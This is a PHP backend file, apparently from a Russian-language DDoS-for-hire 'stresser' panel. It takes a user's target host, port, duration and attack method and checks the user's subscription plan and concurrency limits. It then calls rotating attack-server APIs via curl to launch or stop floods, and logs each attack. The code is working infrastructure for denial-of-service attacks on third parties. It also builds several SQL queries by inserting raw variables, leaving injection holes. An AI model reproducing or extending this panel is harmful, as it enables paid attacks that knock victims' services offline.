<?php

	ob_start();
	require_once '../../../app/config.php';
	require_once '../../../app/init.php'; 

	
	if (!empty($maintaince)) {
		die($maintaince);
	}


	if (!($user->LoggedIn()) || !($user->notBanned($odb)) || !(isset($_GET['type']))) {
		die();
	}

	$type     = $_GET['type'];
	$username = $_SESSION['username'];
	
	//Start attack function
	if ($type == 'start' || $type == 'renew'){
		
		if ($type == 'start') {

			//Get, set and validate!
			$host   = $_GET['host'];		
			$port   = intval($_GET['port']);	
			$time   = intval($_GET['time']);
			$method = $_GET['method'];
			$vip = $_GET['vip'];
			
			//Verifying all fields
			if (empty($host) || empty($time) || empty($port) || empty($method)) {
				die(error('Пожалуйста, заполните все поля!'));
			}

			//Check if the method is legit
			if (!ctype_alnum(str_replace(' ', '', $method))) {
				die(error('Method is unavailable'));
			}

			$SQL = $odb->prepare("SELECT COUNT(*) FROM `methods` WHERE `name` = :method");
			$SQL -> execute(array(':method' => $method));
			$countMethod = $SQL -> fetchColumn(0);

			if ($countMethod == 0) {
				die(error('Method is unavailable'));
			}

			//Check if the host is a valid url or IP
			$SQL = $odb->prepare("SELECT `type` FROM `methods` WHERE `name` = :method");
			$SQL -> execute(array(':method' => $method));
			$type = $SQL -> fetchColumn(0);

			if ($type == 'layer7') {
				if (filter_var($host, FILTER_VALIDATE_URL) === FALSE) {
					die(error('Хост не является допустимым URL'));
				}
				
				
				$parameters = array("ilyxa05", ".gov", ".edu", "$", "{", "%", "<", "snetwork", "mao-stress.xyz", "stresser.tech");

				foreach ($parameters as $parameter) {
					if (strpos($host, $parameter)) {
						die('Вам не разрешено атаковать эти веб-сайты!');
					}
				}

			} elseif (!filter_var($host, FILTER_VALIDATE_IP)) {
                die(error('Хост не является действительным IP-адресом'));
            }
          
            if (!($user->hasMembership($odb))) {
                die(error('У вас нету подписки!'));
            }
			//Check if host is blacklisted
			$SQL = $odb->prepare("SELECT COUNT(*) FROM `blacklist` WHERE `data` = :host' AND `type` = 'victim'");
			$SQL -> execute(array(':host' => $host));
			$countBlacklist = $SQL -> fetchColumn(0);

			if ($countBlacklist > 0) {
				die(error('Хост занесен в черный список'));
			}

		} else {

			$renew     = intval($_GET['id']);
			$SQLSelect = $odb->prepare("SELECT * FROM `logs` WHERE `id` = :renew");
			$SQLSelect -> execute(array(':renew' => $renew));
		
			while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
				$host   = $show['ip'];
				$port   = $show['port'];
				$time   = $show['time'];
				$vip   = $show['vip'];
				$method = $show['method'];
				$userr  = $show['user'];
			}

			if (!($userr == $username) && !$user->isAdmin($odb)) {
				die(error('Это не твоя атака'));
			}
		}

		//Check concurrent attacks
		if ($user->hasMembership($odb)) {
			$SQL = $odb->prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
			$SQL -> execute(array(':username' => $username));
			$countRunning = $SQL -> fetchColumn(0);
			if ($countRunning >= $stats->concurrents($odb, $username)) {
				die(error('У тебя слишком много запущенно атак одновременно.'));
			}
		}

		//Check max boot time
		$SQLGetTime = $odb->prepare("SELECT `plans`.`mbt` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`ID` = :id");
		$SQLGetTime->execute(array(':id' => $_SESSION['ID']));
		$maxTime = $SQLGetTime->fetchColumn(0);

		if (!$user->hasMembership($odb) && $testboots == 1) {
			$maxTime = 60;
		}

		if ($time > $maxTime){
			die(error('Превышено максимальное время загрузки.'));
		}
		
		if($time < 1){
			die(error('Ваша атака должна длиться более 0 секунд'));
		}

		//Check open slots
		if ($stats->runningBoots($odb) > $maxattacks && $maxattacks > 0) {
			die(error('Нет свободных слотов для вашей атаки'));
		}

		
		// check cooldown
		
		if ($cooldown == 1) {
			die(error('Cooldown in progress.. please wait!'));
		}
		
		//Check if test boot has been launched
		if(!$user->hasMembership($odb)){
			$testattack = $odb->query("SELECT `testattack` FROM `users` WHERE `username` = '$username'")->fetchColumn(0);
			if ($testboots == 1 && $testattack > 0) {
				die(error('You have already launched your test attack'));
			}
		}

        //Check rotation
        $i = 0;
		
		// Checks if the attack is VIP
		if ($vip === 1) { 
                $SQLSelectAPI = $odb -> prepare("SELECT * FROM api WHERE vip = '1' AND methods LIKE :method ORDER BY RAND()");
                $SQLSelectAPI -> execute(array(':method' => "%{$method}%"));
        } else { 
            $SQLSelectAPI = $odb -> prepare("SELECT * FROM api WHERE vip = '0' AND methods LIKE :method ORDER BY RAND()");
            $SQLSelectAPI -> execute(array(':method' => "%{$method}%"));
        }
        while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {

            if ($rotation == 1 && $i > 0) {
                break;
            }

            $name = $show['name'];
			$count = $odb->query("SELECT COUNT(*) FROM `logs` WHERE `handler` LIKE '%$name%' AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0")->fetchColumn(0);

            if ($count >= $show['slots']) {
                continue;
            }

            $i++;
            $arrayFind = array('[host]', '[port]', '[time]', '[method]');
            $arrayReplace = array($host, $port, $time, $method);
            $APILink = $show['api'];
			$handler[] = $show['name'];
			$username = $_SESSION['username'];
  
            $APILink = str_replace($arrayFind, $arrayReplace, $APILink);
			
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $APILink);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            $result = curl_exec($ch);
            curl_close($ch);

        }

        if ($i == 0) {
            die(error('Нет свободных серверов для вашей атаки!'));
        }

		//End of attacking servers script
		$handlers     = @implode(",", $handler);

		//Insert Logs
		$chart = date("d-m");
		$insertLogSQL = $odb->prepare("INSERT INTO `logs` VALUES(NULL, :user, :ip, :port, :time, :method, UNIX_TIMESTAMP(), :chart, '0', :handler, :vip)");
		$insertLogSQL -> execute(array(':user' => $username, ':ip' => $host, ':port' => $port, ':time' => $time, ':method' => $method, ':chart' => $chart, ':handler' => $handlers, ':vip' => $vip));

		//Insert test attack
		if (!$user->hasMembership($odb) && $testboots == 1) {
			$SQL = $odb->query("UPDATE `users` SET `testattack` = 1 WHERE `username` = '$username'");
		}

		
		// Gen Here
		
		
		$key = md5(microtime() . rand());
		$insertLogSQL = $odb->prepare("INSERT INTO `ping_sessions` VALUES(NULL, :ping_key, :user_id, :ping_ip, :ping_port)");
		$insertLogSQL -> execute(array(':ping_key' => $key, ':user_id' => $_SESSION['ID'], ':ping_ip' => $host, ':ping_port' => $port));
		
		echo success("Атака успешно запущена!");

	}



	//Stop attack function

	if ($type == 'stop'){

		$stop = intval($_GET['id']);
		$SQLSelect = $odb -> query("SELECT * FROM `logs` WHERE `id` = '$stop'");

		while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
			$host = $show['ip'];
			$port = $show['port'];
			$time = $show['time'];
			$method = $show['method'];
			$handler = $show['handler'];
			$command = $odb->query("SELECT `command` FROM `methods` WHERE `name` = '$method'")->fetchColumn(0);
		}

		$handlers = explode(",", $handler);
	
		foreach ($handlers as $handler){
			
			$SQLSelectAPI = $odb -> query("SELECT `api` FROM `api` WHERE `name` = '$handler' ORDER BY `id` DESC");
	
			while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {

				$APILink = $show['api'];

			}
			
			$arrayFind = array('[host]','[port]','[time]','[method]');
            $arrayReplace = array($method);
		
			$APILink = str_replace($arrayFind, $arrayReplace, $APILink);
			$stopcommand  = "&method=STOP";
			$stopapi = $APILink . $stopcommand;
			
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $stopapi);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_TIMEOUT, 3);
			curl_exec($ch);
			curl_close($ch);
			
		}
		
		$SQL = $odb -> query("UPDATE `logs` SET `stopped` = 1 WHERE `id` = '$stop'");
		die(success('Атака остановлена!'));
		
	}

?>